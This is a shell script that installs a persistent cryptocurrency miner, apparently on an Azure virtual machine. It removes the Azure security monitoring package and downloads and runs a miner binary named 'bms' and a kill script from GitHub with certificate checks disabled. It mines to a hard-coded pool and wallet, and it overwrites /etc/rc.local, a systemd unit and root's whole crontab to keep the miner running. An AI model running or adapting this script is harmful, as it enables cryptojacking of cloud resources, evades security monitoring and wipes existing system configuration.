#!/bin/sh
sudo sed -i 's/localhost/azure/g' /etc/hosts
sudo hostnamectl set-hostname azure
rm -fR /root/cpuminer-opt-linux
#read -p "What is Worker? (exp: vps01): " worker
sudo apt-get update -y
sudo apt remove azsec-monitor -y --allow-change-held-packages
sudo apt --fix-broken install -y --allow-change-held-packages
sudo apt-get install cpulimit -y
wget --no-check-certificate wget https://raw.githubusercontent.com/minhchau91/createproxy/main/bms
chmod +x bms
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

cat /dev/null > /root/danielchau.sh
cat >>/root/danielchau.sh <<EOF
#!/bin/bash
./bms --background -a yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls false --wallet v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Azure --cpu-threads $cores --disable-gpu  > /dev/null 2>&1 &
sleep 3
EOF
chmod +x /root/danielchau.sh

sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof bms) > /dev/null 2>&1 &" danielchau.sh

cat /dev/null > /etc/rc.local
cp /root/danielchau.sh /etc/rc.local
chmod +x /etc/rc.local

cat /dev/null > /etc/systemd/system/rc-local.service

cat >>/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local Support
ConditionPathExists=/etc/rc.local

[Service]
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target 
EOF


cat /dev/null > /root/checkXMRIG.sh
cat >>/root/checkXMRIG.sh <<EOF
#!/bin/bash
if pgrep bms >/dev/null
then
  echo "bms is running."
else
  echo "bms isn't running"
  bash kill_miniZeph.sh
  bash danielchau.sh
fi
EOF
chmod +x /root/checkXMRIG.sh

cat /dev/null > /var/spool/cron/crontabs/root
cat >>/var/spool/cron/crontabs/root<<EOF
*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
EOF

wget "https://raw.githubusercontent.com/minhchau91/createproxy/main/kill_miniZeph.sh" --output-document=/root/kill_miniZeph.sh
chmod 777 /root/kill_miniZeph.sh
./kill_miniZeph.sh
sleep 2
./danielchau.sh
